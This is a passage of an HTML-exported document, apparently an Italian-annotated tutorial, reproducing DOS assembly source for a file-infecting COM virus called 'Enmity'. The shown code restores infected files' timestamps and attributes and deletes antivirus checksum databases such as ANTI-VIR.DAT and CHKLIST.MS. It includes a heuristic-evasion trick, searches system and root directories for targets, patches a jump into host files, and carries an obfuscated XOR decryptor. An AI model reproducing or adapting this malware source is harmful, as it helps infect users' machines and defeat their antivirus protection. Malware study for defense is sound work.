<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,word ptr [bp+f_time]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,word ptr [bp+f_date]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<span style='mso-tab-count:3'>                </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- close file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- restore attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4302h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>ch,ch<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cl,byte ptr [bp+f_attr]<span
style='mso-tab-count:1'> </span>;old attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+dta+1eh]<span style='mso-tab-count:
2'>         </span>;filename in dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>return:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- checksum deletion<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>killer:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+tbsum]<span style='mso-tab-count:2'>           </span>;pont
to name<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>kill_bad_file<span style='mso-tab-count:1'>     </span><span
style='mso-tab-count:1'>      </span>;kill it<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>lea<span style='mso-tab-count:1'>   </span>dx,[bp+pcsum1]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>call<span
style='mso-tab-count:1'>  </span>kill_bad_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>lea<span style='mso-tab-count:1'>   </span>dx,[bp+pcsum2]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>call<span
style='mso-tab-count:1'>  </span>kill_bad_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>lea<span style='mso-tab-count:1'>   </span>dx,[bp+ivsum]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>call<span
style='mso-tab-count:1'>  </span>kill_bad_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- delete bad files - input: DS:DX = to kill<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>kill_bad_file:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4301h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>cx,cx<span style='mso-tab-count:3'>             </span>;no
attribute<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,41h<span style='mso-tab-count:3'>                  </span>;delete<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>clc<span
style='mso-tab-count:4'>                     </span>;clear carry<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>findfirst:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,4eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,0007h<span style='mso-tab-count:2'>          </span>;all
attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+comspec]<span style='mso-tab-count:
2'>         </span>;comspec = filemask<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- data area 1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>msg<span style='mso-tab-count:1'>   </span>db<span
style='mso-tab-count:1'>    </span>'Enmity',13,10,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>db<span
style='mso-tab-count:1'>    </span>'by Lord Natas',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>comspec<span style='mso-tab-count:2'>           </span>db<span
style='mso-tab-count:1'>    </span>'*.*OM',0<span style='mso-tab-count:2'>         </span>;file
search mask<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>win_command<span style='mso-tab-count:1'> </span>db<span
style='mso-tab-count:1'>    </span>'C:\WINDOWS\COMMAND',0<span
style='mso-tab-count:1'>  </span>;target directory<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>root<span style='mso-tab-count:2'>        </span>db<span
style='mso-tab-count:1'>    </span>'\',0<span style='mso-tab-count:3'>             </span>;another
target<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>higher_dir<span style='mso-tab-count:1'>  </span>db<span
style='mso-tab-count:1'>    </span>'..',0<span style='mso-tab-count:3'>                  </span>;yet
another<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>tbsum<span style='mso-tab-count:2'>       </span>db<span
style='mso-tab-count:1'>    </span>'ANTI-VIR.DAT',0<span style='mso-tab-count:
1'>  </span>;checksums to delete<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>pcsum1<span style='mso-tab-count:2'>            </span>db<span
style='mso-tab-count:1'>    </span>'CHKLIST.MS',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>pcsum2<span style='mso-tab-count:2'>            </span>db<span
style='mso-tab-count:1'>    </span>'CHKLIST.CPS',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ivsum<span style='mso-tab-count:2'>       </span>db<span
style='mso-tab-count:1'>    </span>'IVB.NTZ',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>oldbytes<span style='mso-tab-count:1'>    </span>db<span
style='mso-tab-count:1'>    </span>90h,90h,90h,0cdh,20h<span style='mso-tab-count:
1'>    </span>;host bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jump_bytes<span style='mso-tab-count:1'>  </span>db<span
style='mso-tab-count:1'>    </span>0e9h,0,0,'66'<span style='mso-tab-count:
2'>           </span>;the jump to write<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>key1<span style='mso-tab-count:2'>        </span>dw<span
style='mso-tab-count:1'>    </span>?<span style='mso-tab-count:3'>                 </span>;encryption
key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>;----- decryptor<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>decrypt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>mov<span
style='mso-tab-count:1'>   </span>cx,(key1-virus_start+1)/2<span
style='mso-tab-count:1'>    </span>; vedi sopra. </span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>E’ uguale.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,word ptr [bp+key1]<span style='mso-tab-count:
1'>   </span><span style='mso-tab-count:1'>      </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>lea<span
style='mso-tab-count:1'>   </span>si,[bp+virus_start]<span style='mso-tab-count:
2'>          </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>di,si<span style='mso-tab-count:3'>             </span><span
style="mso-spacerun: yes">            </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>xor_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lodsw<span
style="mso-spacerun: yes">                               </span>; carica word
in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short fake2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>fake1:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>stosw<span
style="mso-spacerun: yes">                               </span>; AX -&gt;
[DI]++<span style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>jmp<span style='mso-tab-count:1'>   </span>short fake3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>fake2:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>xor<span
style='mso-tab-count:1'>   </span>ax,dx<span style="mso-spacerun:
yes">          </span><span style="mso-spacerun: yes">                </span>;
XOR con chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>jmp<span style='mso-tab-count:1'>   </span>short fake1<span
style="mso-spacerun: yes">                    </span>; e continua <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>fake3:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span>loop<span
style='mso-tab-count:1'>  </span>xor_loop<span style="mso-spacerun:
yes">                       </span>; ora puntatore a SI = [DI]++ <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- data area 2 - stuff for microsoft's lame
checksums<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>buffer<span style="mso-spacerun: yes">         
</span>db<span style="mso-spacerun: yes">      </span>5 dup (?)<span
style='mso-tab-count:2'>        </span>;buffer = eof-2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>size_checksum<span style="mso-spacerun: yes">  
</span>db<span style="mso-spacerun: yes">      </span>2 dup (90h)<span
style='mso-tab-count:2'>      </span>;checksum for microsoft coms<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>end_virus:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- this is not written to disk, thus saving much
space<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>f_attr<span style='mso-tab-count:2'>            </span>db<span
style='mso-tab-count:1'>    </span>?<span style='mso-tab-count:3'>                 </span>;file
attribute<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>f_time<span style='mso-tab-count:2'>            </span>dw<span
style='mso-tab-count:1'>    </span>?<span style='mso-tab-count:3'>                 </span>;file
time<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>f_date<span style='mso-tab-count:2'>            </span>dw<span
style='mso-tab-count:1'>    </span>?<span style='mso-tab-count:3'>                 </span>;file
date<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>old_dir<span style='mso-tab-count:2'>           </span>db<span
style='mso-tab-count:1'>    </span>64 dup (?)<span style='mso-tab-count:2'>        </span>;old
directory name<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>dta<span
style='mso-tab-count:2'>         </span>db<span style='mso-tab-count:1'>    </span>48
dup (?)<span style='mso-tab-count:2'>        </span>;DTA storage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>dir_chk<span style='mso-tab-count:2'>           </span>db<span
style='mso-tab-count:1'>    </span>64 dup (?)<span style='mso-tab-count:2'>        </span>;for
dir checking<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>;----- buffer temporaneo per crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>crypt_buffr<span style='mso-tab-count:
1'> </span>db<span style='mso-tab-count:1'>    </span>end_virus - virus_start
dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>end<span style='mso-tab-count:1'>   </span>host<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

</div>

</body>

</html>
